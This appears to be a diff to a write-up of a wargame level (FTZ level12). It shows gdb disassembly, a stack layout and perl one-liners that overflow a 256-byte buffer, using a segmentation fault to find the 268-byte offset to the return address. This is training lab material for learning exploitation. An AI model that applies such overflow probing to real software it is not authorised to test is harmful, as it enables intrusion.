@@ -25,7 +25,8 @@ int main( void )
 ```
 
 ```
-[level12@ftz level12]$ gdb -q attackme
+[level12@ftz level12]$ cp attackme tmp/
+[level12@ftz level12]$ gdb -q tmp/attackme
 (gdb) disas main
 0x08048473 <main+3>:    sub    $0x108,%esp
 0x080484bf <main+79>:   call   0x804834c <printf>
@@ -60,3 +61,23 @@ Breakpoint 1, 0x080484bf in main ()
 (gdb) x/s 0x42015574
 0x42015574 <__libc_start_main+228>:      "\211ÁëX1É\213\203\204#"
 ```
+
+-----Memory Structure-----   
+char str[256] : 256byte   
+dummy : 8byte   
+SFP : 4byte   
+RET : 4byte
+
+You can exploit in RET, so you need to input something dummy string (268byte)
+
+```
+[level12@ftz tmp]$ (perl -e 'print "\x41"x267') | /home/level12/attackme
+문장을 입력하세요.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+[level12@ftz tmp]$ (perl -e 'print "\x41"x268') | /home/level12/attackme
+문장을 입력하세요.
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+```
+
